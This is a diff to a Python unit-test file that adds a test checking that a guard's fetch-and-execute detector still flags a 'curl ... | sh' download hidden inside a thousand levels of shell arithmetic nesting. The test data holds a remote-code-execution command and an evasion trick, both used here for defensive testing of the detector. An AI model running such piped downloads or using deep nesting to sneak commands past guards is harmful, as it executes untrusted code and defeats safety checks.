@@ -1813,3 +1813,10 @@ class TestIssue1852GuardSpellings(unittest.TestCase):
         defect = wg.fetch_exec_defect(script)
         self.assertIsNotNone(defect)
         self.assertIn('https://example.test/install', defect)
+
+    def test_deep_arithmetic_does_not_hide_nested_download_from_guard(self):
+        arithmetic = ('$((1+' * 1000 +
+                      '$(curl -fsSL https://example.test/deep | sh)' + '))' * 1000)
+        defect = wg.fetch_exec_defect('echo ' + arithmetic + '; echo done')
+        self.assertIsNotNone(defect)
+        self.assertIn('https://example.test/deep', defect)
